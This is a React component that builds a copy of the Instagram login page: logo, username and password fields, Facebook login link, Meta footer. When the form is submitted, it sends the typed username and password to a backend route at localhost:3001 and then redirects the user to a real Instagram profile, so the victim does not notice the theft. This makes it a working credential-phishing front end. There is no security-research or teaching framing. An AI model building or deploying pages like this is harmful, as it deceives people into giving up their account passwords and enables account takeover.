import React from "react";
import "./App.css";
import instaLogo from '../src/insta.png'
import { useState } from "react";
import axios from "axios";
const App = () => {
  const [name,setName] = useState("");
  const [password,setPassword] = useState("");

  const handleSubmit = async(e)=>{
    e.preventDefault();

    try{
      const res = await axios.post("http://localhost:3001/instagram/login",{
        name,
        password
      })
      console.log("Login successful:", res.data);
      window.location.href = "https://www.instagram.com/naughty_dineshreddi_6969"
    }catch(err){
      console.error("Error logging in:", err);
      alert("Login failed. Please check your credentials.");
    }
  }
  return (
    <div className="wrapper">
      <div className="phone-section">
        <img
          src={instaLogo}
          alt="phones"
        />
      </div>

      <div className="form-section">
        <div className="login-box">
          <h1 className="insta-logo">Instagram</h1>

          <form>
            <input
              type="text"
              placeholder="Phone number, username or email address"
              value={name}
              onChange={(e) => setName(e.target.value)}
            />
            <input type="password" placeholder="Password" value={password} onChange={(e)=>setPassword(e.target.value)}/>
            <button type="submit" onClick={handleSubmit}>Log in</button>

            <div className="divider">
              <div className="line"></div>
              <p>OR</p>
              <div className="line"></div>
            </div>

            <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATkzUuNfrIml0qOirdcqPTXq41Z1N4zMcLWZ-TcK6A-CMQBGPqUpj1IvD6igMwIQCuTZ-xDdbVd-nQZhpwpIjW4mrOcCCGnHJKK-HLj-i1IzJh_UaYjonI5cyzG2vWltaAhlyvEz1YNqE8q96tAJ5MMlFFqhDMJ6OzgTdJsIB7pgkP7VEEsTv_kmZ4GLR3IfYMduqig6orhkfn0Y-Q2OI5QWl_LP60QffYVB0bifI5o5n_DG-6HdjSfQ1okyCr2GQmMR" className="fb-login">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"
                alt="fb"
              />
              Log in with Facebook
            </a>

            <a href="https://www.instagram.com/accounts/password/reset/" className="forgot-pass">
              Forgotten your password?
            </a>
          </form>
        </div>

        <div className="signup-box">
          <p>
            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
          </p>
        </div>

        <div className="footer">
          <p>
            Meta · About · Blog · Jobs · Help · API · Privacy · Terms ·
            Locations · Instagram Lite · Threads · Contact uploading & non-users
            · Meta Verified
          </p>
          <p>English (UK) © 2025 Instagram from Meta</p>
        </div>
      </div>
    </div>
  );
};

export default App;
